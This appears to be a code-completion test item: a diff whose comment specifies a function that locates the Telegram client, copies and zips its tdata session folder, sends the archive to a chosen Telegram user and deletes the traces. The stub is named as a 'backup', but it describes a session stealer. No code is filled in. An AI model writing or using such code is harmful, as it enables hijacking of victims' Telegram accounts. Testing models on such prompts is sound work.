@@ -1,0 +1,2 @@
+\n # A Python program to find a process named "Telegram" to locate the path of the Telegram client; Copy the contents of the tdata directory to a new local directory (called tdata). Then, compress this directory into a compressed file called "tdata. zip". Then send the compressed "tdata. zip" file to the specified Telegram user, and delete the local compressed file and directory after sending is completed. \n  def TelegramDataBackup(
+ <FILL_HERE>
